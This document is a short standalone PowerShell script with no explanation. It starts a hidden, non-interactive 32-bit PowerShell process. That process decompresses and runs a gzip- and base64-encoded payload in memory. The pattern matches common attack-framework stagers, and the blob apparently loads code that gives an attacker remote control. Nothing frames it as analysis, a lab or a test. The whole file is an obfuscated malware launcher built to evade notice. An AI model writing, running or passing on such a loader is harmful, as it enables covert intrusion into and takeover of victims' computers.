if ([IntPtr]::Size -eq 4) 
{
    $b = 'powershell.exe' 
}
else 
{
    $b = $env:windir + '\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'
}; 
$s = New-Object System.Diagnostics.ProcessStartInfo; 
$s.FileName = $b; 
$s.Arguments = '-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
$s.UseShellExecute = $false;
$s.RedirectStandardOutput = $true;
$s.WindowStyle = 'Hidden';
$s.CreateNoWindow = $true;
$p = [System.Diagnostics.Process]::Start($s);